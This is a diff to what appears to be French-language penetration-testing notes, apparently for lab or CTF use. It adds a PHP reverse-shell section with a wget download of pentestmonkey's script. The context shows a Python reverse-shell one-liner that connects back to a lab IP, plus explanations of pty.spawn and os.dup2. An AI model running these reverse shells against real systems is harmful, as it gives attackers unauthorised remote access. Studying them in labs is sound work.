@@ -82,6 +82,10 @@ export RHOST="10.10.14.115";export RPORT=9001;python -c 'import sys,socket,os,pt
 - `pty.spawn()` : spawne un pseudo-terminal
 - `os.dup2()` : duplique les descripteurs de fichiers
 
+### Reverse Shell - php
+https://github.com/pentestmonkey/php-reverse-shell
+wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
 ### Stabilisation du Shell
 
 **Méthode Python :**
